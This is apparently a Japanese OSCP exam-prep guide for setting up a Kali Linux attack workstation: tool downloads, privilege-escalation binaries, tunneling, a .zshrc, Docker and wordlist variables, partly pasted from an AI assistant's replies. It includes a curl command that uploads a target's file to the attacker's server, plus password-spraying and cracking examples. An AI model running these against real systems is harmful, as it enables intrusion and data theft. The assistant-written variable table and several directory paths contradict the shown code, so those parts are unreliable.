

## 4. ツール管理とPython環境 (`pipx`)

システムを汚さず、どこからでもツールを呼び出せるようにします。

1. **pipxのセットアップ:**
```bash
sudo apt install -y pipx && pipx ensurepath

```

2. **便利なユーティリティ:**
```bash
# ペネトレーションテスト・実戦用ツールのインストール
sudo apt install -y rlwrap netexec seclists curl enum4linux-ng \
	flameshot rustscan

```

```bash
# ターミナル・ユーティリティ・フォントのインストール
sudo apt update
sudo apt install -y kitty tmux zoxide fzf \
    zsh-autosuggestions zsh-syntax-highlighting \
    fonts-jetbrains-mono

# Tmux プラグインマネージャー (TPM) の導入    
git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm

# デフォルトターミナルの切り替え
sudo update-alternatives --config x-terminal-emulator # Kittyを選択
```

3. **Git経由のインストール**

* ***AutoRecon (推奨自動化ツール):**

```bash
# 依存関係のインストール後、pipx等でインストール
sudo apt install -y seclists curl dnsrecon nbtscan nikto nmap onesixtyone oscanner smbclient smbmap sslscan ccze
pipx install git+https://github.com/Tib3rius/AutoRecon.git

```

4. **Pythonツールのインストール:**
* `pipx install impacket` (ネットワーク攻撃)
* `pipx install updog` (アップロード対応HTTPサーバ)

4. **Enumeration（列挙）の配置:**

```bash
# 保存用ディレクトリの作成
mkdir -p ~/tools/scripts/windows/enumeration
cd ~/tools/scripts/windows/enumeration

# 1. Seatbelt (GhostPackの主力ツール)
# ※ビルド済みのものを探すか、自身でビルドしたものを配置
# 公式: https://github.com/GhostPack/Seatbelt
# (OSCPでは最新のビルド済みバイナリを整理しておくのが定石です)

# 2. SharpUp (特権昇格のチェックに特化したC#ツール)
# ※ビルド済みのものを探すか、自身でビルドしたものを配置
# https://github.com/GhostPack/SharpUp

# 3. PowerUp.ps1 (PowerShellベースの定番)
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

# 4. WinPEAS (列挙ツールの定番)
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe
```

```bash
# 保存用ディレクトリの作成
mkdir -p ~/tools/scripts/linux/enumeration
cd ~/tools/scripts/linux/enumeration

# 1. LinPEAS (最強の自動列挙スクリプト)
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

# 2. Linux Exploit Suggester (カーネル脆弱性診断)
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh

# 3. pspy (プロセスのリアルタイム監視：cronジョブの特定に便利)
# ※最近はバイナリ版を落としておくのが楽です
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

5. **PrivEsc（権限昇格）の配置:**

```bash
# 保存用ディレクトリの作成
mkdir -p ~/tools/scripts/windows/privesc
cd ~/oscp/scripts/windows/privesc

# 1. Juicy Potato (Windows 2012/2016用)
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

# 2. Rogue Potato (Windows 2019 / Windows 10用)
# ※リポジトリから最新のバイナリを取得
wget https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip

# 3. PrintSpoofer (Juicyが効かない最新環境の定番)
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

# 4. GodPotato (最新の汎用Potato)
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-Net4.exe
```

1. **Pivoting/tunneling(トンネル・横展開)の配置:**

```bash
# 保存用ディレクトリ
mkdir -p ~/tools/scripts/tunneling/chisel
cd ~/oscp/scripts/tunneling/chisel

# 最新リリースの取得 (Linux 64bit用とWindows 64bit用)
# ※バージョン番号は適宜最新を確認してください
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz

# 解凍
gunzip *.gz
mv chisel_1.9.1_linux_amd64 chisel
mv chisel_1.9.1_windows_amd64 chisel.exe
chmod +x chisel

# achiveを保管
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
```

```bash
# 保存用ディレクトリ
mkdir -p ~/tools/scripts/tunneling/ligolo
cd ~/oscp/scripts/tunneling/ligolo

# Proxy (Kali側) と Agent (ターゲット側) を取得
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_proxy_0.5.2_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_windows_amd64.zip

# 解凍して整理
tar -xvf ligolo-ng_proxy_0.5.2_linux_amd64.tar.gz proxy
tar -xvf ligolo-ng_agent_0.5.2_linux_amd64.tar.gz agent
unzip ligolo-ng_agent_0.5.2_windows_amd64.zip -d agent_win
```
---

## 5. ターミナル & マルチプレクサ & スクリーンショット設定





### `~/.zshrc` エッセンス (自動化・効率化)


```bash



# --- 1. 情報更新ロジック (precmd) ---
# プロンプトが表示される直前に、IP情報などを一括更新します
refresh_oscp_prompt() {
    # 自局IPの取得 (tun0優先)
    local my_ip=$(ip -br -4 a show tun0 2>/dev/null | awk '{print $3}' | cut -d/ -f1)
    [ -z "$my_ip" ] && my_ip=$(ip -br -4 a show eth0 2>/dev/null | awk '{print $3}' | cut -d/ -f1)
    CURRENT_MY_IP="${my_ip:-N/A}"

    # ターゲット情報の組み立て
    if [ -n "$ip" ]; then
        if [ -n "$fqdn" ]; then
            TARGET_STATUS="%F{red}[T: $ip ($fqdn)]%f"
        else
            TARGET_STATUS="%F{red}[T: $ip]%f"
        fi
    else
        TARGET_STATUS=""
    fi
}

# zshのフックに登録
autoload -Uz add-zsh-hook
add-zsh-hook precmd refresh_oscp_prompt

# --- 2. ターゲット設定関数 (改良版) ---
target() {
    if [ -z "$1" ]; then
        echo "Usage: target <IP> [FQDN]"
        return 1
    fi

    export ip="$1"
    export target="$1"
    unset fqdn # 前のターゲット情報をクリア
    local tag="# TARGET"
    
    export workdir="$HOME/labs/$ip"
    mkdir -p "$workdir"
    cd "$workdir"

    if [ -n "$2" ]; then
        export fqdn="$2"
        sudo sed -i "/ $fqdn/d; /^$ip /d" /etc/hosts
        echo "$ip $fqdn $tag" | sudo tee -a /etc/hosts > /dev/null
    fi

    echo "[+] Target: $ip (${fqdn:-no fqdn})"
    echo "[+] Switched to: $workdir"
}

target_clear() {
    sudo sed -i "/# TARGET/d" /etc/hosts
    unset ip target fqdn
    echo "[!] Environment & Hosts cleared."
}

# --- 3. プロンプトの定義 ---
setopt prompt_subst
# 左側：[L: 自局IP] パス #
PROMPT='%F{cyan}[L: ${CURRENT_MY_IP}]%f %F{blue}%~%f %# '
# 右側：[T: 相手IP]
RPROMPT='${TARGET_STATUS}'

# Ligolo-ng の設定用 (TUNデバイス作成)
setup_ligolo() {
    sudo ip tuntap add user $USER mode tun ligolo
    sudo ip link set ligolo up
    echo "[+] TUN interface 'ligolo' is UP."
}

# Chisel サーバー起動 (Kali側で待機)
alias chisel_srv='~/tools/scripts/tunneling/chisel/chisel server -p 8080 --reverse'

# メンテナンス・便利エイリアス
alias gclone='cd ~/tools/git && git clone'
alias update-tools='find ~/tools/git -maxdepth 2 -name .git -type d -execdir git pull \;'
alias pserv="python3 -m http.server 80"
alias udot="updog -p 80"
alias icat="kitty +kitten icat"
# 自分のIPを簡潔に表示 (IPv4のみ)
alias myip="ip -br -4 a"
# VPNのIPだけを「値だけ」取り出す (よりシンプルに書けます)
alias vpnip="ip -br -4 a show tun0 | awk '{print \$3}' | cut -d/ -f1"
```

以下に、Kali Linux への Docker / Docker Compose 導入手順を、実務で安定する形に整理してまとめます。

---

# Kali Linux に Docker / Docker Compose を導入する手順（最適版）

## ① システム更新

```bash
sudo apt update && sudo apt upgrade -y
```

---

## ② 必要パッケージ

```bash
sudo apt install -y curl gnupg
```

---

## ③ Docker公式GPGキー登録

```bash
sudo mkdir -p /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/debian/gpg \
  | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg

sudo chmod a+r /etc/apt/keyrings/docker.gpg
```

---

## ④ Dockerリポジトリ追加（Kali対応）

※ Debianコードネームを動的取得

```bash
. /etc/os-release

echo "deb [arch=$(dpkg --print-architecture) \
signed-by=/etc/apt/keyrings/docker.gpg] \
https://download.docker.com/linux/debian \
$VERSION_CODENAME stable" \
| sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
```

---

## ⑤ Docker / Compose インストール

```bash
sudo apt update
sudo apt install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin
```

---

## ⑥ サービス起動

```bash
sudo systemctl enable --now docker
```

---

## ⑦ 動作確認

```bash
docker --version
docker compose version
docker run hello-world
```

---

## ⑧ sudoなしで実行（推奨）

```bash
sudo usermod -aG docker $USER
newgrp docker
```

---

# 補足（重要ポイント）

## ■ Composeはv2が標準

```bash
docker compose
```

※ `docker-compose` は旧式

---

## ■ docker.ioとの違い

|パッケージ|特徴|
|---|---|
|docker.io|簡単・安定（Kali標準）|
|docker-ce|最新・公式|

→ ペンテスト用途なら docker.io でも十分

---

## ■ よくあるトラブル

### 権限エラー

```bash
permission denied ...
```

→ dockerグループ追加 or 再ログイン

---

### Dockerが起動しない

```bash
sudo systemctl restart docker
sudo systemctl status docker
```

---

# 結論

- 手順としては「Docker公式 + Kali対応（動的codename）」が最も安全
    
- Composeは `docker compose`（v2）を使用
    
- 権限設定と動作確認まで行えば実用環境として完成
    

---

必要なら次は：

- ペンテスト用Docker環境（DVWA / Juice Shop）
    
- AutoReconのコンテナ化
    
- Burp Suite + ブラウザ分離構成
    

など、実践向けの構成も設計できます。

その通りですね。`rockyou.txt` は Kali のデフォルト状態では `rockyou.txt.gz` として圧縮されているため、そのままではツールから読み込めません。

また、`Passwords` や `Usernames` といった「自分で収集・加工したクレデンシャル」を別ディレクトリで変数化しておくのは、OSCPの試験中に「今使える有効なリストはどれか」を即座に判断するために非常に賢い選択です。

これを踏まえて、`.zshrc` の定義とディレクトリ構造をより「実戦的」にアップデートしましょう。

---

### 1. クレデンシャル専用の変数設定 (`.zshrc`)

`Workbench/Wordlists` の下に、攻撃フェーズごとの変数を定義します。

Bash

```
# --- Wordlists & Credentials Path ---
export WORDLISTS="$HOME/Workbench/Wordlists"

# 攻撃で見つけた「生きた」情報を格納する場所
export USERS="$WORDLISTS/Usernames"
export PASSES="$WORDLISTS/Passwords"
export CREDS="$WORDLISTS/Credentials"  # user:pass のコンボリスト用

# 定番辞書へのショートカット（解凍後の rockyou をここに置く想定）
export ROCKYOU="$WORDLISTS/Passwords/rockyou.txt"
export SECLISTS="/usr/share/seclists"

# エイリアス: 辞書ディレクトリへ一瞬で移動
alias cdcreds='cd $CREDS'
```

---

### 2. 推奨されるセットアップ手順

`rockyou` の解凍とディレクトリ作成を一度に行うコマンドです。

Bash

```
# ディレクトリ作成
mkdir -p ~/Workbench/Wordlists/{Usernames,Passwords,Credentials}

# rockyou をコピーして解凍（OS標準の場所を汚さない）
cp /usr/share/wordlists/rockyou.txt.gz ~/Workbench/Wordlists/Passwords/
gunzip ~/Workbench/Wordlists/Passwords/rockyou.txt.gz
```

---

### 3. 実戦でのコマンド使用例

変数を活用することで、タイピングミスを減らし、直感的に攻撃を組み立てられます。

- **ユーザー列挙で見つけた名前を保存する際:**
    
    Bash
    
    ```
    # ターゲットから抜いたユーザー名をリストに追加
    echo "admin" >> $USERS/target_users.txt
    ```
    
- **パスワードスプレー (NetExec):**
    
    Bash
    
    ```
    # 収集したユーザーリストと、定番パスワードリストをぶつける
    nxc smb $TARGET_IP -u $USERS/target_users.txt -p $PASSES/common_pass.txt
    ```
    
- **ハッシュ解析 (Hashcat/John):**
    
    Bash
    
    ```
    # 解凍済みの $ROCKYOU を指定
    john --wordlist=$ROCKYOU hashes.txt
    ```
    

---

### 📋 チートシートへの最終修正（Wordlistsセクション）

以下の表を「5. Kali 基本コマンド」のあたりに上書きしてください。

|**変数名**|**パス**|**用途**|
|---|---|---|
|**`$USERS`**|`~/Workbench/Wordlists/Usernames`|ターゲットから列挙したユーザー名リスト。|
|**`$PASSES`**|`~/Workbench/Wordlists/Passwords`|収集したパスワード候補、解凍済みRockyou。|
|**`$CREDS`**|`~/Workbench/Wordlists/Credentials`|`admin:password123` 形式のコンボリスト。|
|**`$SECLISTS`**|`/usr/share/seclists`|Kali標準の巨大な辞書群（Web列挙用）。|

---

### 💡 プロのアドバイス：ターゲット専用リストの運用

試験中、あるマシンで `valid_users.txt` を作った場合、それを `$USERS/10.10.10.101_users.txt` のように保存しておくと、後で別のマシン（AD環境など）に対して再利用する際に、変数 `$USERS` から一瞬で呼び出せるようになります。

これで「パスの入力」というストレスから完全に解放されました。

次は、**「収集した資格情報を Obsidian の『証拠物件テーブル』へ自動で整理して貼り付ける方法」** などを検討しますか？それとも、環境構築はこれで一段落として、ツール自体の使い方を深掘りしますか？

承知いたしました。今回の環境構築で定義したすべての変数を網羅し、役割を整理した「OSCP環境変数マスターリスト」を作成しました。これをチートシートの核心部分に据えてください。

また、Geminiの記憶機能（Personal Intelligence）の設定がオフになっているようです。これらの設定を将来の会話でも私が自動で踏まえるようにしたい場合は、[過去のチャットに基づくパーソナライズ](https://gemini.google.com/personalization-settings)をオンにしてください。

---

## 💎 OSCP 環境変数マスターリスト (統合版)

今回の `.zshrc` 強化によって、パス入力の手間はほぼゼロになりました。

### 1. ターゲット管理（動的・自動生成）

`target <IP>` コマンド実行時に自動的にセット・更新される変数です。

|**変数名**|**内容**|**活用例**|
|---|---|---|
|**`$TARGET_IP`**|ターゲットのIPアドレス|`nmap $TARGET_IP`|
|**`$TARGET_NAME`**|ターゲットのFQDN/ホスト名|`ffuf -u http://$TARGET_NAME/`|
|**`$WORKDIR`**|現在のターゲットのルート (`~/Vault/Target/$IP`)|`cd $WORKDIR`|
|**`$OUT`**|スキャン結果保存先 (`$WORKDIR/result`)|`nmap -oA $OUT/init $TARGET_IP`|
|**`$LOG`**|Tmux等のログ保存先 (`$WORKDIR/log`)|`ls $LOG`|
|**`$ASSETS`**|スクショ等の証拠保存先 (`$WORKDIR/assets`)|`flameshot full -p $ASSETS`|
|**`$SCREENSHOT_DIR`**|現在のSS保存先（シンボリックリンク経由）|`swz` で切り替え可能|

### 2. ネットワーク・ステータス（動的更新）

`precmd` によって、プロンプトが表示されるたびに最新状態に更新されます。

|**変数名**|**内容**|**備考**|
|---|---|---|
|**`$CURRENT_MY_IP`**|自分のIP (tun0優先、次いでeth0)|プロンプト左側 `[L: ...]` に表示|
|**`$TARGET_STATUS`**|ターゲットの表示用文字列|プロンプト右側 `[T: ...]` に表示|

### 3. Wordlists & クレデンシャル（固定・共通）

攻撃リソースへ即座にアクセスするための定数です。

|**変数名**|**パス**|**用途**|
|---|---|---|
|**`$WORDLISTS`**|`~/Workbench/Wordlists`|自作・加工済み辞書の親ディレクトリ|
|**`$USERS`**|`$WORDLISTS/Usernames`|収集したユーザー名リスト|
|**`$PASSES`**|`$WORDLISTS/Passwords`|収集したパス、解凍済み Rockyou|
|**`$CREDS`**|`$WORDLISTS/Credentials`|`user:pass` 形式のコンボリスト|
|**`$ROCKYOU`**|`$PASSES/rockyou.txt`|最強のパスワードリスト|
|**`$SECLISTS`**|`/usr/share/seclists`|Kali標準の Web 攻略用辞書群|

---

## 🛠️ 変数を使いこなす「黄金のワンライナー」

この変数群があるからこそできる、ミスを減らすためのコマンド例です。

- **Webディレクトリ爆撃:**
    
    Bash
    
    ```
    ffuf -u http://$TARGET_NAME/FUZZ -w $SECLISTS/Discovery/Web-Content/common.txt -o $OUT/ffuf_web.json
    ```
    
- **パスワードスプレー (AD環境):**
    
    Bash
    
    ```
    nxc smb $TARGET_IP -u $USERS/discovered_users.txt -p $PASSES/easy_passwords.txt
    ```
    
- **自分へのファイル転送:**
    
    Bash
    
    ```
    # ターゲットから抜いたファイルを、Kali側の結果フォルダへ直接受ける
    # (Kali側)
    cd $OUT && udot
    # (Windows側)
    curl -F "file=@secret.txt" http://$CURRENT_MY_IP/upload
    ```
    

---

### 📋 最終確認

- [ ] すべての変数が `echo $VARIABLE_NAME` で正しく表示されるか？
    
- [ ] 特に `$OUT` や `$ASSETS` が、`target` 切り替え時に連動して動くか？
    

これで、あなたの Kali Linux は「パスを打つ場所」から「攻撃を組み立てる場所」へと完全に昇華されました。

次は、**「これらの変数を利用して、Burp Suite のログや Metasploit の出力を自動的に $LOG フォルダへ流し込む設定」** などを進めますか？